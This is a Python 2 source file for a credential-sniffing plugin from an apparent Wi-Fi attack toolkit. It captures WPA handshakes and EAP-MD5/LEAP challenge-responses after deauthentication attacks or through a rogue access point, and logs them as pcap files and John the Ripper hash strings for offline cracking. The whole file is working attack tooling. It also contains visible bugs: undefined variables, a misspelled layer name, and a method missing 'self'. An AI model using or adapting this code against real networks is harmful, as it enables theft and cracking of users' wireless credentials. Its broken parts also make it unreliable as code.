# -*- coding: utf-8 -*-
"""
This class will be a plugin for all Air modules
It will sniff the network for WPA 4-way handshakes and EAPoL MD5 and MsCHAPv2 credentials
It can be used after a deauthentication attack
While sniffing or even while running a fake access point
"""
import os
from plugin import AirScannerPlugin, AirHostPlugin, AirDeauthorPlugin
from AuxiliaryModules.packet import Beacon
from scapy.all import Ether, Dot11Beacon, EAPOL, EAP, LEAP, PcapWriter, sniff, load_contrib
from utils.networkmanager import NetworkCard
from threading import Thread
from time import sleep
try:  # Python Scapy-Com check (inspiration from EAPEAK/McIntyre)
	from scapy.layers.l2 import eap_types as EAP_TYPES
except ImportError:
	print "[-] Community version of Scapy (Scapy-Com) is missing, please run setup.py for full instalation"
	sys.exit(0)

class CredentialSniffer(AirScannerPlugin, AirHostPlugin, AirDeauthorPlugin):

	def __init__(self):
		#super(CredentialSniffer, self).__init__("credentialsniffer")
		AirScannerPlugin.__init__(self, "credentialsniffer")
		AirHostPlugin.__init__(self, "credentialsniffer")
		AirDeauthorPlugin.__init__(self, "credentialsniffer")
		self.running_interface = self.config["sniffing_interface"]
		self.wifi_clients = {}
		self.wpa_handshakes = {}
		self.broadcasted_bssids = {} #bssid: beacon_packet

		self.sniffer_thread = None
		self.stop = False
		try:
			self.fixed_channel = int(self.config["channel"])
		except:
			self.fixed_channel = 7

		self.timeout = self.config["timeout"]

		# When sniffing for credentials on interface running in master mode
		# scapy will only be able to sniff for layer 3 packets (Networking)
		# so it never receives a Beacon packet (layer2) to verify the access point ssid
		# best to pass it as parameter since we are running the access point we know the ssid
		self.is_ap = False
		self.ssid = self.config["ssid"]
		

	# This will be called by the AirSniffer
	def handle_packet(self, packet):
		self.extract_credential_info(packet)

	# This will be called when starting the access point
	def start(self):
		self.is_ap = True
		self.sniffer_thread = Thread(target=self.start_credential_sniffing)
		self.sniffer_thread.start()

	# This will be called before a deauthentication attack
	# The channel needs to be fixed so it does not miss any packets
	def pre_deauth(self):
		card = NetworkCard(self.running_interface)
		card.set_channel(self.fixed_channel)

	# This will be called after a deauthentication attack
	def post_deauth(self):
		print "[+] Starting Handshake or Credential sniffing on {} and channel {} for {} seconds".format(
																				self.running_interface, 
																				self.fixed_channel,
																				self.timeout)
		self.sniffer_thread = Thread(target=self.start_credential_sniffing)
		stop_timer_thread = Thread(target= self.timed_stop, args=(self.timeout,))
		self.sniffer_thread.start()
		stop_timer_thread.start()

	def start_credential_sniffing(self):
		try:
			sniff(	store		=	0,
					prn			=	self.extract_credential_info,
					stop_filter	=	self._stop)
		except Exception as e: 
			print "Error Occurred while sniffing"
			print e
			pass

	def restore(self):
		self.stop = True

	def timed_stop(self, time_seconds):
		sleep(time_seconds)
		print "[+] Stopping credential sniffing"
		self.stop = True

	def _stop(self, packet):
		return self.stop

	def extract_credential_info(self, packet):
		if packet.haslayer(Dot11Beacon):
			beacon = Beacon(packet)
			self.broadcasted_bssids[beacon.bssid] = (beacon.ssid, packet)
			return

		if packet.name == 'RadioTap dummy':
			packet = packet.payload  # Offset it so we start with the Dot11 header

		if packet.haslayer(EAPOL):
			self.parse_wpa_handshake_packet(packet)
		elif packet.haslayer(EAP):
			self.parse_eap_packet(packet)

	def parse_wpa_handshake_packet(self, packet):
		"""
		Looks for frame number 2, 3 and 4 of the WPA 4-Way Handshake and logs the packets
		to be cracked with aircrack-ng or cowpatty
		"""
		eapol_packet = packet["EAPOL"]

		# Frame 1
		# Flags: KeyType + ACK
		if eapol_packet.flags == 17:
			client_mac = self._get_destination_from_packet(packet)
			bssid = self._get_source_from_packet(packet)
			try:
				self.wpa_handshakes[client_mac]['frame1'] = True
				self.wpa_handshakes[client_mac]['bssid'] = bssid
				self.wpa_handshakes[client_mac]['packets'].append(packet)
			except Exception as e:
				self._prepare_wpa_handshake_log(client_mac)
				self.wpa_handshakes[client_mac]['frame1'] = True
				self.wpa_handshakes[client_mac]['bssid'] = bssid
				self.wpa_handshakes[client_mac]['packets'].append(packet)

		# Frame 2
		# Flags: KeyType + MIC	
		elif eapol_packet.flags == 33:
			client_mac = self._get_source_from_packet(packet)
			bssid = self._get_destination_from_packet(packet)
			try:
				self.wpa_handshakes[client_mac]['frame2'] = True
				self.wpa_handshakes[client_mac]['bssid'] = bssid
				self.wpa_handshakes[client_mac]['packets'].append(packet)
			except Exception as e:
				self._prepare_wpa_handshake_log(client_mac)
				self.wpa_handshakes[client_mac]['frame2'] = True
				self.wpa_handshakes[client_mac]['bssid'] = bssid
				self.wpa_handshakes[client_mac]['packets'].append(packet)

		# Frame 3
		# Flags: KeyType + Install + ACK + MIC + Secure + Encrypted
		elif eapol_packet.flags == 633:
			client_mac = self._get_destination_from_packet(packet)
			try:
				self.wpa_handshakes[client_mac]['frame3'] = True
				self.wpa_handshakes[client_mac]['replay_counter'] = packet.replay
				self.wpa_handshakes[client_mac]['packets'].append(packet)
			except Exception as e: pass # Caught some response packets before capturing the requests

		# Frame 4
		# Flags: KeyType + MIC + Secure
		elif eapol_packet.flags == 97:
			client_mac = self._get_source_from_packet(packet)
			try:
				if packet.replay == self.wpa_handshakes[client_mac]['replay_counter']:
					self.wpa_handshakes[client_mac]['frame4'] = True
					self.wpa_handshakes[client_mac]['packets'].append(packet)
			except Exception as e: pass # Caught some response packets before capturing the requests

		self._log_wpa_handshake(client_mac)


	def _get_source_from_packet(self, packet):
		try:
			ethernet_header = packet["Ether"]
			return ethernet_header.src
		except:
			dot11_header = packet["Dot11"]
			return dot11_header.addr2

	def _get_destination_from_packet(self, packet):
		try:
			ethernet_header = packet["Ether"]
			return ethernet_header.dst
		except:
			dot11_header = packet["Dot11"]
			return dot11_header.addr1


	def _prepare_wpa_handshake_log(self, client_mac):
		fields = {
					'frame1': False,
					'frame2': False,
					'frame3': False,
					'frame4': False,
					'beacon': False,
					'logged': False,
					'ssid':   None,
					'bssid':  None,
					'replay_counter': None,
					'packets': []
				 }
		self.wpa_handshakes[client_mac] = fields

	def _log_wpa_handshake(self, client_mac):
		if self.is_ap:
			self._log_half_wpa_handshake(client_mac)
		else:
			self._log_complete_wpa_handshake(client_mac)


	def _log_half_wpa_handshake(self, client_mac):
		self.wpa_handshakes[client_mac]['ssid'] = self.ssid
		if (self.wpa_handshakes[client_mac]['frame1'] and 
			self.wpa_handshakes[client_mac]['frame2'] and
			not self.wpa_handshakes[client_mac]['logged']):

			print "[+] Half WPA Handshake found for client '{}' and network '{}'\n".format(	client_mac,
																						self.ssid)

			log_file_path = "data/wpa_half_handshakes/handshake_{}_{}.cap".format(	self.ssid,
																					client_mac)
			self._log_packets(log_file_path, client_mac)


	def _log_complete_wpa_handshake(self, client_mac):
		# Get the corresponding beacon packet of the captured handshake
		try:
			bssid = self.wpa_handshakes[client_mac]['bssid']
			if bssid in self.broadcasted_bssids:
				beacon = self.broadcasted_bssids[bssid][1]
				self.wpa_handshakes[client_mac]['beacon'] = True
				self.wpa_handshakes[client_mac]['ssid'] = self.broadcasted_bssids[bssid][0]
				self.wpa_handshakes[client_mac]['packets'].append(beacon)
		except Exception as e:
			print "Exception: ", e
			return
			
		# Only the last 3 frames are needed
		# Aircrack needs at least one beacon to know the ESSID
		# Cowpatty is default WPA/WPA2 cracker because 
		# it is still able to crack the password even if ssid is not in packet information
		# as long as it is passed as an argument, the ssid is logged in the name of the file
		if (self.wpa_handshakes[client_mac]['frame2'] and 
			self.wpa_handshakes[client_mac]['frame3'] and
			self.wpa_handshakes[client_mac]['frame4'] and
			self.wpa_handshakes[client_mac]['beacon'] and
			not self.wpa_handshakes[client_mac]['logged']):

			print "[+] WPA Handshake found for client '{}' and network '{}'\n".format(	client_mac,
																					self.wpa_handshakes[client_mac]['ssid'])

			log_file_path = "data/wpa_handshakes/handshake_{}_{}.cap".format(	self.wpa_handshakes[client_mac]['ssid'],
																				client_mac)
			self._log_packets(log_file_path, client_mac)

	def _log_packets(self, file_path, client_mac):
		cap_writer = PcapWriter(file_path, append=True, sync=True)
		for packet in self.wpa_handshakes[client_mac]['packets']:
			cap_writer.write(packet)
		self.wpa_handshakes[client_mac]['logged'] = True



	def parse_eap_packet(self, packet):
		eap_layer = packet[EAP]
		if eap_layer.type not in EAP_TYPES: 
			return

		REQUEST, RESPONSE = 1, 2

		# Means that we are the Access Point that the use is connecting to
		if Ether in packet:
			client_mac = packet[Ether].dst
		elif self._packet_is_from_ap(packet):
			client_mac = self._get_destination_from_packet(packet)
		else:
			client_mac = self._get_source_from_packet(packet)
			
		if client_mac:
			if not client_mac in self.wifi_clients:
				self.wifi_clients[client_mac] = WiFiClient(client_mac)
		else:
			return

		client = self.wifi_clients[client_mac]

		client.user_id = eap_layer.id

		if EAP_TYPES[eap_layer.type] == "ID" and eap_layer.code == RESPONSE:
			client.identity = eap_layer.identity

		elif EAP_TYPES[eap_layer.type] == "MD5":
			auth_id = eap_layer.id
			if not auth_id in client.authentications["MD5"]:
				client.authentications["MD5"][auth_id] = ChallengeResponseAuth(auth_id, "MD5")
			authentication = client.authentications["MD5"][auth_id]

			if eap_layer.code == REQUEST:
				authentication.challenge = eap_layer.load[1:17].encode("HEX")
			elif packets[EAP].code == RESPONSE:
				authentication.response = eap_layer.load[1:17].encode("HEX")

		elif EAP_TYPES[eap_layer.type] == "LEAP":
			auth_id = eap_layer.id

			if not auth_id in client.authentications["LEAP"]:
				client.authentications["LEAP"][auth_id] = ChallengeResponseAuth(auth_id, "LEAP")
			authentication = client.authentications["LEAP"][auth_id]

			leap_leayer = packet[LEAP]

			if leap_layer.name:
				authentication.username = leap_layer.name
			if eap_layer.code == REQUEST:
				if len(leap_layer.data) == 8:
					authentication.challenge = leap_layer.data.encode("HEX")
			elif packets[EAP].code == RESPONSE:
				if len(leap_layer.data) == 24:
					authentication.response = eap_layer.data.encode("HEX")

		client.check_and_log_credentials()


class WiFiClient(object):

	def __init__(self, client_mac):
		self.client_mac = client_mac
		self.user_id = None
		self.identity = None
		self.authentications = 	{	# {Type(MD5 or LEAP) : {auth_id : ChallengeResponseAuth}}
									"MD5" 	: {},
									"LEAP" 	: {}
								}	

	def check_and_log_credentials(self):
		chall_resps = []
		for auth in self.authentications["MD5"]:
			chall_resps.append(self.authentications["MD5"][auth])

		for auths in self.authentications["LEAP"]:
			chall_resps.append(self.authentications["LEAP"][auth])

		for chall_resp in chall_resps:
			if chall_resp.is_complete():
				chall_resp.log()




class ChallengeResponseAuth(object):

	def __init__(self, auth_id, type, username=None, challenge=None, response=None):
		self.auth_id = auth_id
		self.type = type
		self.username = username
		self.challenge = challenge
		self.response = response

	def is_complete(self):
		return not (self.username is None or self.challenge is None or self.response is None)

	def log():
		if self.type == "MD5":
			# Save in JTR format
			# username:$1$salt$hash
			jtr_hash_string = "{username}:$1{salt}${hash}".format(	username=self.username,
																	salt=self.challenge,
																	hash=self.response  )
		elif self.type == "LEAP":
			jtr_hash_string = "{username}:$NETNTLM${salt}${hash}".format(	username=self.username,
																			salt=self.challenge,
																			hash=self.response  )

		print "Hash String:\n" + jtr_hash_string
		n_log = len(os.listdir("data/hashes"))
		out = open("eap_hashes{}.log".format(n_log), "a")
		out.write(jtr_hash_string + "\n")
		out.close()

		
	def __eq__(self, other):
		return self.auth_id == other.auth_id

	def __ne__(self, other):
		return not self.__eq__(self, other)